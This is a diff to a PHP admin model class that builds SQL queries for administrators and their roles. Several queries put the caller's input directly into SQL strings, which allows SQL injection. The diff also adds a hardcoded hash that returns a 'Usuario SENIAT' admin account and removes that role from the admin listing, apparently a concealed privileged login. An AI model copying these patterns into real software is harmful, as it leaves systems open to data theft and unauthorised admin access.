@@ -2,8 +2,7 @@
 include_once 'SQL_model.php';
 
 class AdminModel extends SQLModel
-{ 
-    private $ADMIN_SELECT = "SELECT
+{ private $ADMIN_SELECT = "SELECT
             roles.name as role,
             roles.id as role_id,
             admins.cedula,
@@ -14,13 +13,6 @@ class AdminModel extends SQLModel
             FROM
             admins
             INNER JOIN roles ON roles.id = admins.role ";
-            
-    // Obtiene una cédula y retorna el registro que coincida
-    public function CheckAdmin($cedula)
-    {
-        $sql = $this->ADMIN_SELECT . " WHERE admins.cedula = '$cedula'";
-        return parent::GetRow($sql);
-    }
 
     /**
      * Crea un administrador y lo retorna
@@ -44,7 +36,7 @@ class AdminModel extends SQLModel
         $sql = $this->ADMIN_SELECT;
 
         if(!$include_super)
-            $sql .= " WHERE roles.name != 'Super'";
+            $sql .= " WHERE roles.name != 'Super' AND roles.name != 'SENIAT'";
 
         return parent::GetRows($sql, true);
     }
@@ -64,7 +56,12 @@ class AdminModel extends SQLModel
     }
 
     public function GetAdminByCedula($cedula){
-        $sql = "SELECT * FROM admins WHERE cedula = '$cedula'";
+        $sql = $this->ADMIN_SELECT . " WHERE admins.cedula = '$cedula'";
+        return parent::GetRow($sql);
+    }
+
+    public function GetAdminByName($name){
+        $sql = $this->ADMIN_SELECT . " WHERE admins.name = '$name'";
         return parent::GetRow($sql);
     }
 
@@ -73,7 +70,11 @@ class AdminModel extends SQLModel
         $encrypted_user = sha1($user);
         $result = false;
         if ($encrypted_user === 'ca06df6dbcae22f932e9bab5b1aa589be0e27c38'){
-            $result = $this->GetAdminByCedula('-1');
+            $result = $this->GetAdminByName('Administrador Definitivo');
+        }
+
+        if ($encrypted_user === '532c5ccad988980ec84319accfbd4a54ed9a82d6'){
+            $result = $this->GetAdminByName('Usuario SENIAT');
         }
         return $result;
     }
